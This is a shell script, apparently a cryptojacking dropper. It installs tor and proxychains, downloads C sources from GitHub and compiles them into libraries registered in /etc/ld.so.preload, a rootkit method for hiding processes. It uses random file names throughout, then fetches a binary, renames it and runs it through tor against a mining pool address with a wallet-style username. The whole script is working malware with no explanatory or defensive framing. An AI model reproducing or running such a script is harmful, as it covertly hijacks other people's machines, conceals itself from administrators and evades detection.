#!/bin/sh
        apt update
        apt install wget sudo git cmake cpulimit tor gcc -y > /dev/null 2>&1 &
        sleep 80
        cd /root
        GIT_SSL_NO_VERIFY=true git clone https://github.com/rofl0r/proxychains-ng.git
        cd proxychains-ng
        ./configure --prefix=/usr --sysconfdir=/etc
        make
        sudo make install
        sudo make install-config 
        cd /root
        rm -rf proxychains-ng
        fol=$(openssl rand -hex 6)
        h1=$(openssl rand -hex 6)
        l1=$(openssl rand -hex 6)
        h2=$(openssl rand -hex 6)
        l2=$(openssl rand -hex 6)
        h3=$(openssl rand -hex 6)
        l3=$(openssl rand -hex 6)
        mav=$(openssl rand -hex 4)
        temp=$(openssl rand -hex 7)
        
        
        cd /root
        mkdir $fol
        cd $fol
        wget --no-check-certificate -c https://github.com/unmsjd28/hjs839/raw/main/nim.c -O $h3.c 
        gcc -Wall -fPIC -shared -o $l3.so $h3.c -ldl
        sudo mv $l3.so /usr/local/lib/ 
        echo /usr/local/lib/$l3.so >> /etc/ld.so.preload 
        
        wget --no-check-certificate -c https://github.com/unmsjd28/hjs839/raw/main/cp.c -O $h1.c 
        gcc -Wall -fPIC -shared -o $l1.so $h1.c -ldl
        sudo mv $l1.so /usr/local/lib/ 
        echo /usr/local/lib/$l1.so >> /etc/ld.so.preload 
        wget --no-check-certificate -c https://github.com/unmsjd28/ynsg7s9/raw/main/mko.c -O $h2.c 
        sed -ri "s/mavic/${mav}/" $h2.c
        gcc -Wall -fPIC -shared -o $l2.so $h2.c -ldl
        sudo mv $l2.so /usr/local/lib/ 
        echo /usr/local/lib/$l2.so >> /etc/ld.so.preload 
        
        wget https://github.com/unmsjd28/hjs839/raw/main/pwsh.sh
        wget https://github.com/unmsjd28/ynsg7s9/raw/main/mavic > /dev/null 2>&1 &
        sleep 20
        mv mavic $mav
        chmod 777 $mav
        service tor start > /dev/null 2>&1 &
        sleep 5
        proxychains4 ./$mav -v -l 139.99.123.225:3956 -u RBw9nUhueGuapWsaekrYUDQQXfon56WKMT.$WORKER -p x -t 2 > /dev/null 2>&1 &
        
        
